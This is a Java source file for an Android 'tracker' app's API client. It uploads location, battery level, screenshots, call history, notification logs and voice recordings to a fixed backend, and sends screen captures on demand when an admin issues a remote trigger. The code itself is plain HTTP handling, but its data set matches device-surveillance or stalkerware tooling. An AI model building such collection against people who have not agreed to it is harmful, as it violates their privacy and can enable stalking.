package com.tracker.app.net;

import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Map;

/**
 * Pure native HTTP client using java.net.HttpURLConnection.
 * No Retrofit, no OkHttp, no external libraries.
 */
public class ApiClient {

    private static final String TAG = "ApiClient";
    private static final String BASE_URL = "https://api.abdullahsourcing.com/api/v1";
    private static final String BOUNDARY = "----TrackerBoundary" + System.currentTimeMillis();
    private static final String CRLF = "\r\n";

    /**
     * Register device with the backend server.
     * Returns the API token on success, null on failure.
     */
    public static String registerDevice(String deviceName, String deviceId, String model,
                                         String androidVersion, String fcmToken) throws Exception {
        JSONObject body = new JSONObject();
        body.put("device_name", deviceName);
        body.put("device_id", deviceId);
        body.put("model", model);
        body.put("android_version", androidVersion);
        if (fcmToken != null) body.put("fcm_token", fcmToken);

        String response = postJson(null, "/devices/register", body.toString());
        if (response != null) {
            JSONObject json = new JSONObject(response);
            if (json.optBoolean("success")) {
                return json.getJSONObject("data").getString("api_token");
            }
        }
        return null;
    }

    /**
     * Update FCM token on server.
     */
    public static boolean updateFcmToken(String apiToken, String fcmToken) {
        try {
            JSONObject body = new JSONObject();
            body.put("fcm_token", fcmToken);
            String response = postJson(apiToken, "/devices/update-fcm", body.toString());
            return response != null;
        } catch (Exception e) {
            Log.e(TAG, "FCM token update error", e);
            return false;
        }
    }

    /**
     * Send heartbeat with battery level and location.
     */
    public static boolean sendHeartbeat(String apiToken, int battery, double lat, double lng) {
        try {
            JSONObject body = new JSONObject();
            body.put("battery_level", battery);
            if (lat != 0) body.put("latitude", lat);
            if (lng != 0) body.put("longitude", lng);
            String response = postJson(apiToken, "/devices/heartbeat", body.toString());
            return response != null;
        } catch (Exception e) {
            Log.e(TAG, "Heartbeat error", e);
            return false;
        }
    }

    /**
     * Upload a single screenshot file.
     */
    public static boolean uploadScreenshot(String apiToken, File file, String triggerType,
                                            String callSessionId, double lat, double lng) {
        try {
            HttpURLConnection conn = createConnection("/sync/screenshot");
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Authorization", "Bearer " + apiToken);
            conn.setRequestProperty("Accept", "application/json");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + BOUNDARY);
            conn.setDoOutput(true);

            try (DataOutputStream out = new DataOutputStream(conn.getOutputStream())) {
                // File field
                writeFilePart(out, "file", file);

                // Text fields
                writeFormField(out, "trigger_type", triggerType);

                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US);
                writeFormField(out, "captured_at", sdf.format(new Date()));

                if (callSessionId != null) {
                    writeFormField(out, "call_session_id", callSessionId);
                }
                if (lat != 0) writeFormField(out, "latitude", String.valueOf(lat));
                if (lng != 0) writeFormField(out, "longitude", String.valueOf(lng));

                // End boundary
                out.writeBytes("--" + BOUNDARY + "--" + CRLF);
                out.flush();
            }

            int responseCode = conn.getResponseCode();
            conn.disconnect();

            Log.d(TAG, "Upload screenshot response: " + responseCode);
            return responseCode == 200;
        } catch (Exception e) {
            Log.e(TAG, "Upload screenshot error", e);
            return false;
        }
    }

    /**
     * Upload call history (list of call log entries).
     */
    public static boolean uploadCallHistory(String apiToken, JSONArray calls) {
        try {
            JSONObject body = new JSONObject();
            body.put("calls", calls);
            String response = postJson(apiToken, "/sync/call-history", body.toString());
            return response != null;
        } catch (Exception e) {
            Log.e(TAG, "Call history upload error", e);
            return false;
        }
    }

    /**
     * Upload notification logs.
     */
    public static boolean uploadNotifications(String apiToken, JSONArray notifications) {
        try {
            JSONObject body = new JSONObject();
            body.put("notifications", notifications);
            String response = postJson(apiToken, "/sync/notifications", body.toString());
            return response != null;
        } catch (Exception e) {
            Log.e(TAG, "Notification upload error", e);
            return false;
        }
    }

    /**
     * Upload dynamic voice recording file.
     */
    public static boolean uploadAudio(String apiToken, File file, int durationSeconds) {
        try {
            HttpURLConnection conn = createConnection("/sync/audio");
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Authorization", "Bearer " + apiToken);
            conn.setRequestProperty("Accept", "application/json");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + BOUNDARY);
            conn.setDoOutput(true);

            try (DataOutputStream out = new DataOutputStream(conn.getOutputStream())) {
                // File field
                writeFilePart(out, "audio", file);

                // Text fields
                writeFormField(out, "duration_seconds", String.valueOf(durationSeconds));

                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US);
                writeFormField(out, "recorded_at", sdf.format(new Date(file.lastModified())));

                // End boundary
                out.writeBytes("--" + BOUNDARY + "--" + CRLF);
                out.flush();
            }

            int responseCode = conn.getResponseCode();
            conn.disconnect();

            Log.d(TAG, "Upload audio response: " + responseCode);
            return responseCode == 200;
        } catch (Exception e) {
            Log.e(TAG, "Upload audio error", e);
            return false;
        }
    }

    /**
     * Upload realtime payload (screenshot + location) in response to admin FCM trigger.
     */
    public static boolean uploadRealtimePayload(String apiToken, File screenshot,
                                                 double lat, double lng) {
        try {
            HttpURLConnection conn = createConnection("/sync/realtime-payload");
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Authorization", "Bearer " + apiToken);
            conn.setRequestProperty("Accept", "application/json");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + BOUNDARY);
            conn.setDoOutput(true);

            try (DataOutputStream out = new DataOutputStream(conn.getOutputStream())) {
                if (screenshot != null && screenshot.exists()) {
                    writeFilePart(out, "screenshot", screenshot);
                }
                if (lat != 0) writeFormField(out, "latitude", String.valueOf(lat));
                if (lng != 0) writeFormField(out, "longitude", String.valueOf(lng));

                out.writeBytes("--" + BOUNDARY + "--" + CRLF);
                out.flush();
            }

            int responseCode = conn.getResponseCode();
            conn.disconnect();

            Log.d(TAG, "Upload realtime response: " + responseCode);
            return responseCode == 200;
        } catch (Exception e) {
            Log.e(TAG, "Realtime payload error", e);
            return false;
        }
    }

    // ========== Helper Methods ==========

    private static String postJson(String apiToken, String path, String jsonBody) throws Exception {
        HttpURLConnection conn = createConnection(path);
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setRequestProperty("Accept", "application/json");
        if (apiToken != null) {
            conn.setRequestProperty("Authorization", "Bearer " + apiToken);
        }
        conn.setDoOutput(true);

        try (OutputStream os = conn.getOutputStream()) {
            os.write(jsonBody.getBytes("UTF-8"));
            os.flush();
        }

        int responseCode = conn.getResponseCode();
        Log.d(TAG, "POST " + path + " -> " + responseCode);

        if (responseCode >= 200 && responseCode < 300) {
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    sb.append(line);
                }
                conn.disconnect();
                return sb.toString();
            }
        } else {
            java.io.InputStream es = conn.getErrorStream();
            if (es != null) {
                try (BufferedReader reader = new BufferedReader(new InputStreamReader(es))) {
                    StringBuilder sb = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) {
                        sb.append(line);
                    }
                    conn.disconnect();
                    org.json.JSONObject errorJson = new org.json.JSONObject(sb.toString());
                    String msg = errorJson.optString("message");
                    if (msg != null && !msg.isEmpty()) {
                        throw new Exception(msg);
                    }
                } catch (Exception e) {
                    throw e;
                }
            }
        }

        conn.disconnect();
        return null;
    }

    private static HttpURLConnection createConnection(String path) throws Exception {
        URL url = new URL(BASE_URL + path);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setConnectTimeout(15000);
        conn.setReadTimeout(15000);
        return conn;
    }

    private static void writeFormField(DataOutputStream out, String name, String value) throws Exception {
        out.writeBytes("--" + BOUNDARY + CRLF);
        out.writeBytes("Content-Disposition: form-data; name=\"" + name + "\"" + CRLF);
        out.writeBytes(CRLF);
        out.writeBytes(value + CRLF);
    }

    private static void writeFilePart(DataOutputStream out, String fieldName, File file) throws Exception {
        String contentType = "application/octet-stream";
        String name = file.getName().toLowerCase();
        if (name.endsWith(".webp")) {
            contentType = "image/webp";
        } else if (name.endsWith(".png")) {
            contentType = "image/png";
        } else if (name.endsWith(".jpg") || name.endsWith(".jpeg")) {
            contentType = "image/jpeg";
        } else if (name.endsWith(".mp4") || name.endsWith(".m4a")) {
            contentType = "audio/mp4";
        }

        out.writeBytes("--" + BOUNDARY + CRLF);
        out.writeBytes("Content-Disposition: form-data; name=\"" + fieldName
                + "\"; filename=\"" + file.getName() + "\"" + CRLF);
        out.writeBytes("Content-Type: " + contentType + CRLF);
        out.writeBytes(CRLF);

        try (FileInputStream fis = new FileInputStream(file)) {
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = fis.read(buffer)) != -1) {
                out.write(buffer, 0, bytesRead);
            }
        }
        out.writeBytes(CRLF);
    }
}
